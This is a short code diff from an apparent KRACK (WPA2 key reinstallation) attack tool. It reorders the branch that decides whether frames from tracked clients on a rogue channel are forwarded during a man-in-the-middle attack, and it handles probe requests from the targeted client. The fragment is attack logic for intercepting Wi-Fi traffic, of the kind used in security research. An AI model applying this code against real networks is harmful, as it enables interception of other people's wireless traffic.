@@ -477,14 +477,6 @@ class KRAckAttack():
 				self.clients[p.addr2].mark_got_mitm()
 				client = self.clients[p.addr2]
 				will_forward = True
-			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
-			elif p.addr2 in self.clients:
-				client = self.clients[p.addr2]
-				will_forward = client.should_forward(p, args.group)
-				if (will_forward):
-					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
-				else:
-					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
 				if (p.haslayer(Dot11ProbeReq)):
@@ -495,6 +487,14 @@ class KRAckAttack():
 					np = dot11/Dot11ProbeReq()/essid/dsset
 					self.sock_real.send(np, True, self.netconfig.real_channel)
 				# print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
+			elif p.addr2 in self.clients:
+				client = self.clients[p.addr2]
+				will_forward = client.should_forward(p, args.group)
+				if (will_forward):
+					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				else:
+					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
